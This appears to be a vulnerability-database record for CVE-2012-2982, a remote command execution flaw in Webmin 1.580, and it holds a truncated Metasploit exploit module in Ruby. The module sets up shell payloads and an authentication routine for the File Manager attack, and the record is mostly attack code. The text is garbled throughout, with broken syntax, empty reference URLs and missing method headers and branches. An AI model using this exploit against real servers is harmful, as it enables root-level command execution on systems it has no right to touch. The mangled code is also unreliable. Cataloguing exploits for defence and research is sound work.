{
    "text": "vul_url : ， vul_name : Webmin /file/show.cgi Remote Command Execution ， vul_date : 2012.09.17 ， vul_credit_name : juan vazquez ， vul_risk : High ， vul_local : No ， vul_remote : Yes ， vul_cve : CVE-2012-2982 ， vul_cwe : CWE-78 ， vul_poc : ， # This file is part of the Metasploit Framework and may be subject to ， # redistribution and commercial restrictions. Please see the Metasploit ， # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf:Exploit:Remote ， Rank = ExcellentRanking ， include Msf:Exploit:Remote:HttpClient ， super(update_info(info, ， 'Name' => 'Webmin /file/show.cgi Remote Command Execution', ， 'Description' => %q{ ， This module exploits an arbitrary command execution vulnerability in Webmin ， 1.580. The vulnerability exists in the /file/show.cgi component and allows an ， authenticated user, with access to the File Manager Module, to execute arbitrary ， commands with root privileges. The module has been tested successfully with Webim ， 1.580 over Ubuntu 10.04. ， }, ， 'Author' => [ ， 'Unknown', # From American Information Security Group ， 'juan vazquez' # Metasploit module ， ], ， 'License' => MSF_LICENSE, ， ' ， [ ， ['OSVDB', '85248'], ， ['BID', '55446'], ， ['CVE', '2012-2982'], ， ['URL', ' ， ['URL', ' ， ], ， 'Privileged' => true, ， 'Payload' => ， { ， 'DisableNops' => true, ， 'Space' => 512, ， 'Compat' => ， { ， 'PayloadType' => 'cmd', ， 'RequiredCmd' => 'generic perl bash telnet', ， } ， }, ， 'Platform' => 'unix', ， 'Arch' => ARCH_CMD, ， 'Targets' => [ 'Webim 1.580', { }], ， 'DisclosureDate' => 'Sep 06 2012', ， 'DefaultTarget' => 0) ， register_options( ， [ ， Opt:RPORT(10000), ， OptBool.new('SSL', [true, 'Use SSL', true]), ， OptString.new('USERNAME', [true, 'Webmin Username']), ， OptString.new('PASSWORD', [true, 'Webmin Password']) ， ], self.class) ， end ， def check ， peer = \"#{rhost}:#{rport}\" ， print_status(\"#{peer} - Attempting to login.\") ， data = \"page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}\" ， res = send_request_cgi( ， { ， 'method' => 'POST', ， 'uri' => \"/session_login.cgi\", ， 'cookie' => \"testing=1\", ， 'data' => data ， }, 25) ， print_good \"#{peer} - Authentication successful\" ， session = res.headers['Set-Cookie'].split(\"sid=\")[1].split(\";\")[0] ， print_error \"#{peer} - Authentication failed\""
}